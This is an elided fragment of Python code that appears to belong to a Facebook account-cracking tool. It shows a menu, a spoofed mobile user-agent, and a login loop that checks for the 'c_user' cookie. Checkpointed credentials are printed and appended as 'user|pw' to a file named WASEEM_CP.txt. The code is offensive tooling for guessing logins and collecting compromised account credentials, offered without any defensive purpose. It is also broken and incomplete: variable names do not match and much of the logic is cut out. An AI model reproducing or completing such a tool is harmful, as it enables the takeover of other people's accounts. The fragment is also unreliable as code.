...
def WASOO():
    ...
    print(' [E] exit ')
    print('')
    _Waseem___ = input(' [?] Choose option : ')
    if _WASEEM___ in ('1', '01'):
        __xxx__().Waseem(id)
              ...
              "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        pass
                    print('\r%s [Waseem-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('WASEEM_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
